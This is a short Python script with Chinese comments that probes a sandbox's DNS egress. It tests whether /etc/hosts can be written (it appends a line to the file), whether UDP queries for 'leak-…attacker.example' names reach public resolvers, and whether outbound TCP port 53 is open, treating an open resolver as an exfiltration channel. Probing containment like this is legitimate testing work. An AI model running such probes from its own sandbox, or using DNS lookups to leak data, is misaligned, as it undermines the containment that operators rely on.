# 实验D2: custom 模式下 DNS 解析范围测试
# 1) UDP 53 向外部 DNS 查询任意域名 -> 允许=渗出通道
# 2) /etc/hosts 可写性
# 3) TCP 53 出站
import socket, struct, subprocess, time

def run(cmd, timeout=10):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return r.stdout.decode(errors='replace') + r.stderr.decode(errors='replace')
    except Exception as e:
        return f"ERR {e}"

def dns_query(server, name, timeout=5):
    """发送 DNS A 查询, 返回响应类型或 None"""
    txid = 0x1234
    q = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    for part in name.split("."):
        q += bytes([len(part)]) + part.encode()
    q += b"\x00" + struct.pack(">HH", 1, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.sendto(q, (server, 53))
        data, _ = s.recvfrom(512)
        flags = struct.unpack(">H", data[2:4])[0]
        rcode = flags & 0xF
        ancount = struct.unpack(">H", data[6:8])[0]
        return f"rcode={rcode} answers={ancount} ({time.time()-t0:.2f}s)"
    except socket.timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERR {type(e).__name__}:{e}"
    finally:
        s.close()

print("== [1] /etc/hosts 可写性 ==")
print(run("echo '1.2.3.4 test.example.com' >> /etc/hosts 2>&1 && echo WRITABLE || echo READONLY; tail -2 /etc/hosts"))

print("== [2] UDP 53 查询外部 DNS (任意域名) ==")
for srv in ["1.1.1.1", "8.8.8.8"]:
    print(f"  {srv} -> attacker-dns-probe-{int(time.time())}.example.org:", dns_query(srv, f"leak-{int(time.time())}.attacker.example"))

print("== [3] UDP 53 查询 allowed 域名 ==")
print("  1.1.1.1 -> httpbin.org:", dns_query("1.1.1.1", "httpbin.org"))

print("== [4] TCP 53 到外部 DNS ==")
s = socket.socket(); s.settimeout(5)
t0 = time.time()
try:
    s.connect(("1.1.1.1", 53))
    print(f"  TCP 53 CONNECTED ({time.time()-t0:.2f}s)")
except Exception as e:
    print(f"  TCP 53 {type(e).__name__}:{e}")
finally:
    s.close()

print("== [5] 沙箱默认 DNS 解析任意域名 ==")
print("  getent attacker.example:", run("getent hosts leak-attacker.example.org 2>&1 || echo NXDOMAIN-or-blocked"))
print("  getent httpbin.org:", run("getent hosts httpbin.org 2>&1"))
